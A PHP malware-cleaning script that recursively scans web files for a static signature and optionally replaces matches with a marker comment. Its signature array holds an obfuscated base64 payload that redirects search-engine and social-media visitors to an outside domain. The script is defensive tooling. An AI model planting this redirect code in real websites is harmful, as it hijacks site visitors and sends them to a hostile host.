<?php
/*
 * Скрипт поиска и удаления вредоносных вставок по статичным сигнатурам.
 * Перед использованием необходимо изменить массив сигнатур ($signatures)
 * Запуск: php find-virus.php /dir/for/search clean
 * Если не указан параметр clean скрипт произведёт только поиск вставок.
 * Автор: Антон Кузьмин | anton.kuzmin.russia@gmail.com | http://anton-kuzmin.blogspot.com/
 */

// Массив сигнатур
$signatures = array('eval(base64_decode("DQoNCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwidHdpdHRlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29vZ2xlIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInlhbmRleC5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtYWlsLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm1zbiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vayIpKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsJCQ0KCQloZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vZ29vb29nbGUub3NhLnBsLyIpOw0KCQlleGl0KCk7DQoJfQ0KfQ0KfQ=="));'
);
// Максимальный размер файлов для чтения в байтах (1Мб = 1 000 000 б)
$sizeLimit = 10000000;

if(!isset($argv[1])) die(help());
$searchPath = $argv[1];
if(!file_exists($searchPath)) die("Path $searchPath not exists!\n");

$infected = $bigSize = $notReadable = $notWritable = array();

$files = globRecursive("$searchPath*");
foreach($files as $file) {
    if(filesize($file) > $sizeLimit) {
        $bigSize[] = $file;
        continue;
    } else {
        if(is_readable($file)) {
            $content = file_get_contents($file);
            foreach($signatures as $sigKey => $signature) {
                if($i = substr_count($content, $signature)) {
                    print "$file (Sig:$sigKey|Count:$i)\n";
                    if(isset($argv[2]) AND $argv[2] == 'clean') {
                        if(is_writable($file)) {
                            $content = str_replace($signatures, "\n/* HERE WAS VIRUS */\n", $content);
                            file_put_contents($file, $content);
                            print "CLEANED $file\n";
                        } else $notWritable[] = $file;
                    }
                }
            }
        } else $notReadable[] = $file;
    }
}

if(count($bigSize)) {
    print "Files with very big size:\n";
    foreach($bigSize as $file)
        print "    $file\n";
}
if(count($notReadable)) {
    print "Not readable files:\n";
    foreach($notReadable as $file)
        print "    $file\n";
}
if(count($notWritable)) {
    print "Not writable files:\n";
    foreach($notWritable as $file)
        print "    $file\n";
}

/* Функция прендазначенная для рекурсивного поиска файлов */
function globRecursive($pattern, $flags = 0)
{
    $files = glob($pattern, $flags);
       
    foreach (glob(dirname($pattern).'/*', GLOB_ONLYDIR|GLOB_NOSORT) as $dir)
    {
        $files = array_merge($files, globRecursive($dir.'/'.basename($pattern), $flags));
    }
       
    return $files;
}

// Справка
function help() {
    print "================================================================================\n";
    print "Script for search and delete viruses in web-files by signatures.\n";
    print "Before use you must change source of this script for write signatures!\n";
    print "Usage: php find-virus.php /dir/for/search clean\n";
    print "If you don`t write 'clean' in params, script will only find suspiciousness files.\n";
    print "(c) Anton Kuzmin | anton.kuzmin.russia@gmail.com | http://anton-kuzmin.blogspot.com/\n";
    print "================================================================================\n";
}
